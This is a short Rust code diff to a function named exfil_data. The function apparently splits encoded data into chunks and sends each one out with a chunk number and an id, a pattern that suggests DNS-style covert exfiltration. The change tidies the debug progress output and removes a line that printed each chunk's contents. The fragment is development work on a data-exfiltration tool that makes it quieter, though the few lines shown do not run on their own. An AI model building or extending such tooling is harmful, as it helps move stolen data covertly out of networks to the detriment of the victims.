@@ -52,11 +52,9 @@ pub async fn exfil_data(encoded_data: &str) -> Result<(), Box<dyn Error>> {
 
         #[cfg(feature = "debug")] {
             use std::io::{Write, stdout};
-            println!("[*] Sending chunk [{:02}/{}]", chunk_num, total_chunks);
+            print!("\r[*] Sending chunk [{:02}/{}]", chunk_num, total_chunks);
             stdout().flush().unwrap();
         }
-
-        println!("[*] Sending chunk: {}", chunk);
 
         send_data(&client, &format!("{}.{}.{}", chunk, chunk_num, id)).await?;
 
